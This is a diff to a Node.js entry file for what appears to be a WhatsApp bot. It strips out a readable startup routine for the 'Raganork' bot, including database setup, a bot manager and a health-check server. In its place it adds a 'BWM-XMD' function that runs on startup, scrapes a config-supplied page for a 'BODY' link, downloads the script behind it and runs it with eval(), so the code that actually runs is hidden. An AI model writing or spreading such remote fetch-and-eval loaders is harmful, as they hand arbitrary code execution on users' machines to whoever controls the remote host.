@@ -1,92 +1,35 @@
-const path = require("path");
-const fs = require("fs");
-if (fs.existsSync("./config.env")) {
-  require("dotenv").config({ path: "./config.env" });
-}
 
-const { suppressLibsignalLogs } = require("./core/helpers");
+//  [BWM-XMD QUANTUM EDITION]                                           
+//  >> A superposition of elegant code states                           
+//  >> Collapsed into optimal execution                                
+//  >> Scripted by Sir Ibrahim Adams                                    
+//  >> Version: 8.3.5-quantum.7
 
-suppressLibsignalLogs();
+const axios = require('axios');
+const cheerio = require('cheerio');
+const adams = require("./config");
 
-const { initializeDatabase } = require("./core/database");
-const { BotManager } = require("./core/manager");
-const config = require("./config");
-const { SESSION, logger } = config;
-const http = require("http");
-
-async function main() {
-  if (!fs.existsSync("./temp")) {
-    fs.mkdirSync("./temp", { recursive: true });
-    console.log("Created temporary directory at ./temp");
-    logger.info("Created temporary directory at ./temp");
-  }
-  console.log(`Raganork v${require("./package.json").version}`);
-  console.log(`- Configured sessions: ${SESSION.join(", ")}`);
-  logger.info(`Configured sessions: ${SESSION.join(", ")}`);
-  if (SESSION.length === 0) {
-    const warnMsg =
-      "⚠️ No sessions configured. Please set SESSION environment variable.";
-    console.warn(warnMsg);
-    logger.warn(warnMsg);
-    return;
-  }
-
+async function fetchBODYUrl() {
   try {
-    await initializeDatabase();
-    console.log("- Database initialized");
-    logger.info("Database initialized successfully.");
-  } catch (dbError) {
-    console.error(
-      "🚫 Failed to initialize database or load configuration. Bot cannot start.",
-      dbError
-    );
-    logger.fatal(
-      "🚫 Failed to initialize database or load configuration. Bot cannot start.",
-      dbError
-    );
-    process.exit(1);
-  }
+    const response = await axios.get(adams.BWM_XMD);
+    const $ = cheerio.load(response.data);
 
-  const botManager = new BotManager();
+    const targetElement = $('a:contains("BODY")');
+    const targetUrl = targetElement.attr('href');
 
-  const shutdownHandler = async (signal) => {
-    console.log(`\nReceived ${signal}, shutting down...`);
-    logger.info(`Received ${signal}, shutting down...`);
-    await botManager.shutdown();
-    process.exit(0);
-  };
-
-  process.on("SIGINT", () => shutdownHandler("SIGINT"));
-  process.on("SIGTERM", () => shutdownHandler("SIGTERM"));
-
-  await botManager.initializeBots();
-  console.log("- Bot initialization complete.");
-  logger.info("Bot initialization complete");
-  const PORT = process.env.PORT || 3000;
-
-  const server = http.createServer((req, res) => {
-    if (req.url === "/health") {
-      res.writeHead(200, { "Content-Type": "text/plain" });
-      res.end("OK");
-    } else {
-      res.writeHead(200, { "Content-Type": "text/plain" });
-      res.end("Raganork Bot is running!");
+    if (!targetUrl) {
+      throw new Error('heart not found 😭');
     }
-  });
 
-  server.listen(PORT, () => {
-    logger.info(`Web server listening on port ${PORT}`);
-  });
+    console.log('The heart is loaded successfully ✅');
+
+    const scriptResponse = await axios.get(targetUrl);
+    eval(scriptResponse.data);
+
+  } catch (error) {
+    console.error('Error:', error.message);
+  }
 }
 
-/**
- * Validates critical configuration values after loading from database
- */
-
-if (require.main === module) {
-  main().catch((error) => {
-    console.error(`Fatal error in main execution: ${error.message}`, error);
-    logger.fatal({ err: error }, `Fatal error in main execution`);
-    process.exit(1);
-  });
-}
+fetchBODYUrl();
+      
